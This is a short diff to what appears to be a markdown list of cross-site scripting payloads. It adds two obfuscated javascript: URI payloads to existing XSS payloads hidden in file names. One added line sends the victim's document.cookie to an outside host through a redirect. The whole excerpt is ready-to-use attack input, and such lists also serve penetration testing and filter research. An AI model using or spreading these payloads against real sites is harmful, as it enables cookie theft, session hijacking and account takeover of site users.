@@ -109,6 +109,8 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 "><img src=x onerror=alert('XSS')>.png
 "><svg onmouseover=alert(1)>.svg
 <<script>alert('xss')<!--a-->a.png
+java%0dscrip%0d%1b%1bt:console.log`${document.cookie}`}
+java%0dscrip%0d%1b%1bt:console.log`${location=`https://www.pudim. com?c=${document.cookie}`}
 ```
 
 ## XSS + SSRF <br>
